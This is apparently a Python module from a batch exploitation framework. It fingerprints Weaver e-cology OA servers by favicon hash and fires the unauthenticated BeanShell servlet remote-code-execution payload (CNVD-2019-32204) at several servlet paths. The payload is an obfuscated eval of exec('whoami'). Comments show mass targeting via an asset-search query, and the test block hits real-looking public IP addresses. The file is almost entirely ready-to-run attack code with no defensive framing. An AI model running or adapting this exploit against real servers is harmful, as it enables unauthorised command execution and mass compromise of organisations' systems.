# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 22:06

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *

# module rule
from core.variablemanager import GlobalVariableManager


# app="泛微-协同办公OA"
# python batch.py -m exploit.web.OA.Weaver.e-weaver.unauth_bsh_rce -cs -fs "app=\"泛微-协同办公OA\""


class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CNVD-2019-32204'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/weaver/bsh.servlet.BshServlet',
                             '/bsh.servlet.BshServlet',
                             '/weaveroa/bsh.servlet.BshServlet',
                             '/oa/bsh.servlet.BshServlet']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['41eca7a9245394106a09b2534d8030df',
                        '281348dd57383c1f214ffb8aed3a1210',
                        '9b1d3f08ede38dbe699d6b2e72a8febb',
                        'c27547e27e1d2c7514545cd8d5988946']

    async def detect(self):
        try:
            # 同类型多模块的识别规则
            checkList = GlobalVariableManager.getValue('exploitRule')[self.name]
            for checkTarget in checkList:
                if self.target == checkTarget:
                    tqdm.write(Fore.RED + '[{}] detect method skip...'.format('E-Weaver Finger'))
                    # 如果存在的话，那么当前这个target的框架已经探测完毕了，
                    # 就没必要再次探测，所以直接进入exec方法中，唯一需要变动的就是flag=True
                    self.flag = True
                    return None
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                checkList.append(self.target)
                                tqdm.write(Fore.RED + '[{}] {}'.format('E-Weaver Finger', url))
                                return {'name': 'E-Weaver Finger', 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
                async with self.session.post(url=url, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        tqdm.write(Fore.RED + '[{}] {}'.format('E-Weaver bsh RCE', url))
                        return {'name': 'E-Weaver bsh RCE', 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))